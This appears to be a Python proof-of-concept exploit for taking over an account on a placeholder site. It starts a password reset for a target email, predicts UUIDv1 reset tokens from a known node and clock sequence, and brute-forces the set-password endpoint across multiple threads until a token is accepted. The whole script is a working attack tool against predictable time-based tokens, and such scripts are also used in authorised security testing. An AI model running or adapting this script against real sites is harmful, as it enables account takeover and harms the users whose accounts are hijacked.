#!/usr/bin/python3

import argparse
import time
import uuid
from requests import Session
import urllib3
from bs4 import BeautifulSoup
import threading
import argparse
import concurrent.futures
import itertools
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Extracted from ACME generated uuid1
CLOCK_SEQ = 1337
NODE = "REPLACE_ME"

HOST = "https://www.acmecompany.com"
SESSION = ""
CSRF = ""
ABORT = False
THREADS = 10
payloads = []


def generate():
    print("[-] Begin parallel UUIDv1 generation.")
    for i in range(100000):
        u = uuid.uuid1(node=NODE, clock_seq=CLOCK_SEQ)
        payloads.append(u)
    print("[-] UUIDv1 candidates generation completed.")


def prep_payloads(payloads):
    tmp = []
    # Trim down a selection of payloads to eliminate those generated to far before or after the UUID event
    for i in payloads[39000:50000]:
        l = str(i).split("-")
        l[0] = l[0][:6] + "FUZZ"
        tmp.append('-'.join(l))
    payloads = None
    return tmp


def get_csrf(endpoint):
    res = SESSION.get(HOST + endpoint, verify=False)
    if res.status_code == 200:
        soup = BeautifulSoup(res.text, features="lxml")
        csrf = soup.find('input', {'name': '_csrf'})['value']
        if csrf:
            return csrf


def send_post(endpoint, data):
    print("[-] Sending POST request to: " + endpoint)
    res = SESSION.post(HOST + endpoint, verify=False, data=data)
    return res.status_code


def init_reset(email):
    data = {
        "_csrf": CSRF,
        "emailAddress": email
    }
    return send_post("/account/lost-password", data) == 200


def create_file(filename, iterator):
    with open(filename, "w") as f:
        for p in iterator:
            f.write(f"{p}\n")
        f.close()


def fuzz(payloads, fuzzers):
    for p in payloads:
        # Abort switch to close out all futures
        if ABORT:
            return False
        else:
            for f in fuzzers:
                t = p.replace("FUZZ", f)
                res = SESSION.get(HOST + "/account/set-password/" + t, verify=False)
                if res.status_code == 200 and "The verification code has expired," not in res.text:
                    print(f"\n[!] Success: {t}")
                    return True
    return False
 

def set_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--email", help="Account email to reset", required=True)
    parser.add_argument("--debug",
        help="Use when debugging. Will write payloads to disk.\nIn order to speed validation, check the first 6 characters of the first UUID segment sent to the test email are present in 'payloads.txt'",
        required=False,
        action=argparse.BooleanOptionalAction
    )
    parser.add_argument("--threads", help=f"Number of threads to break attack into. Must be an even number. default: {THREADS}", required=False, type=int)
    parser.add_argument("--no_proxies", help=f"Don't use proxies for requests", required=False, action=argparse.BooleanOptionalAction)
    return parser.parse_args()


def time_elapsed(start):
    end = time.time()
    hours, rem = divmod(end-start, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{int(hours)}:{int(minutes)}:{int(seconds)}"


if __name__ == "__main__":
    args = set_args()

    if args.email:
        print("[-] Targeting: " + args.email)
    if args.debug:
        print("[-] Debugging mode enabled. Payloads written to './payloads.txt'.")
    else:
        print("[-] Debugging not enabled.")
    if args.threads:
        t = args.threads
        if isinstance(t, int):
            THREADS = t
    if args.no_proxies:
        PROXIES = None

    SESSION = Session()
    CSRF = get_csrf("/account/lost-password")
    t1 = threading.Thread(target=generate)
    t2 = threading.Thread(target=init_reset, args=(args.email,))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    payloads = prep_payloads(payloads)

    if args.debug:
        create_file("payloads.txt", payloads)
        fuzzers = ["00", "10", "20", "30", "40", "50", "60", "70", "80", "90"]
    else:
        all_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        fuzzers = [''.join(i) for i in itertools.product(all_chars, repeat = 2)]

    # Break payloads into n subsets for threads
    chunked_payloads = list()
    chunk_size = int(len(payloads)/THREADS)
    for i in range(0, len(payloads), chunk_size):
        chunked_payloads.append(payloads[i:i+chunk_size])
    payloads = None

    print(f"[-] Searching for password reset token with {len(chunked_payloads)} threads...")
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(chunked_payloads)) as executor:
        future_fuzz = {executor.submit(fuzz, payload, fuzzers): payload for payload in chunked_payloads}
        for future in concurrent.futures.as_completed(future_fuzz):
            payload = future_fuzz[future]
            try:
                if future.result():
                    print(f"[!] Time elapsed (hh:mm:ss): {time_elapsed(start)}.")
                    ABORT = True
            except Exception as e:
                print(str(e))
    if ABORT is not True:
        print("[X] Failed.")
